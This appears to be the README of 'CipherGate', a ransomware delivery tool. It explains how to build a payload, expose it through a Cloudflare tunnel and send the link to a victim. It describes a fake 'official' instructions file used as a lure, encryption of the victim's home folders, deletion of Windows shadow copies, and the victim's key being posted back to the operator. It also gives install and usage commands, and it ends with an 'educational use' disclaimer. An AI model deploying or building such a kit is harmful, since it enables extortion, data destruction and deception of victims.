# CipherGate

A one-command ransomware delivery server for Termux and Kali Linux.
Builds a payload, tunnels it to the public internet with Cloudflare, prints
the link. Send the link. Keys come back to your terminal automatically.

```
python3 main.py
```

That is the whole workflow.

---

## What it does

1. Generates an RSA-2048 keypair (cached in `keys/` — **never ships the private key**).
2. Starts a local HTTP server with a themed landing page.
3. Opens a Cloudflare quick tunnel and prints a public `https://*.trycloudflare.com` URL.
4. Builds `dist/Unlock_My_Files.zip` containing the payload, launchers, and public key.
5. Serves that zip behind a random one-time token on the landing page.
6. Receives the victim's wrapped AES key back on `/keys` and prints it in your console.

The link works from **any network** — mobile data, other countries, anything.
It is not limited to your WiFi.

---

## Install

### Termux

```bash
pkg update && pkg upgrade -y
pkg install python -y
termux-setup-storage
git clone <your-repo> ciphergate && cd ciphergate
pip install -r requirements.txt
```

### Kali Linux

```bash
sudo apt update && sudo apt install python3 python3-pip -y
git clone <your-repo> ciphergate && cd ciphergate
pip3 install -r requirements.txt --break-system-packages
```

`cloudflared` is downloaded automatically into `bin/` on first run. No manual install.

---

## Usage

```bash
python3 main.py                 # start server + tunnel, print link
python3 main.py --port 9000     # different port
python3 main.py --no-tunnel     # LAN only, prints http://<your-ip>:<port>
python3 main.py --decrypt       # restore files with keys/private.pem + aes_key.enc
```

Example output:

```
  ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗  ██████╗  █████╗ ████████╗███████╗
  ██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
  ██║     ██║██████╔╝███████║█████╗  ██████╔╝██║  ███╗███████║   ██║   █████╗
  ██║     ██║██╔══██╗██╔══██║██╔══╝  ██╔══██╗██║   ██║██╔══██║   ██║   ██╔══╝
  ╚██████╗██║██║  ██║██║  ██║███████╗██║  ██║╚██████╔╝██║  ██║   ██║   ███████╗
   ╚═════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝

  [+] payload  : Unlock_My_Files.zip (48.2 KB)
  [+] token    : 8f3c1a9d2b04

  SEND THIS LINK TO THE VICTIM:
  ────────────────────────────────────────────────────
  https://random-words-here.trycloudflare.com/?t=8f3c1a9d2b04
  ────────────────────────────────────────────────────
```

---

## Victim side

The landing page offers the zip. Inside it:

| File | Purpose |
|---|---|
| `Unlock_My_Files.py` | The payload. Needs `pip install cryptography` |
| `START.bat` | Windows one-click launcher |
| `START.sh` | Linux / Termux launcher |
| `README.txt` | Fake "official" instructions |
| `public.pem` | Embedded reference copy |

After execution the victim's files are renamed `*.locked`, a
`READ_ME_TO_RESTORE.txt` note is dropped in every folder, and `aes_key.enc`
lands in their home directory. That file gets POSTed back to you.

---

## Recovery

```bash
# copy keys/private.pem and the victim's aes_key.enc into one folder, then:
python3 main.py --decrypt
```

Restores every `*.locked` under the user home and deletes the encrypted copies.

---

## Flags

| Flag | Default | Meaning |
|---|---|---|
| `--port` | `8000` | Local server port |
| `--no-tunnel` | off | Skip cloudflared, print LAN IP |
| `--decrypt` | off | Restore mode |
| `--key` | `aes_key.enc` | Key file for restore mode |
| `--max-mb` | `100` | Skip files larger than this |
| `--token` | random | Override the download token |

---

## Troubleshooting

**`cloudflared` download fails** — GitHub is blocked or the arch is unsupported.
Drop a static binary into `bin/cloudflared` manually and `chmod +x` it.

**Tunnel prints nothing for 30s** — Cloudflare is rate-limiting your IP.
Wait a minute, or use `--no-tunnel` and port-forward yourself.

**`No module named cryptography`** — `pip install -r requirements.txt`.
On the victim machine the same applies; `START.sh` handles it.

**Files already encrypted on re-run** — the payload skips `*.locked`, but
running it twice in the same home can double-lock new files. Restore first.

---

## Scope

Encrypts `Documents`, `Desktop`, `Pictures`, `Downloads`, `Music`, `Videos`
and the current directory. Skips `AppData`, `node_modules`, `.git`, `venv`,
`$RECYCLE.BIN`, `System Volume Information`. Deletes shadow copies on Windows.

---

## Legal

Educational use. No warranty. Run it on a snapshot or VM first.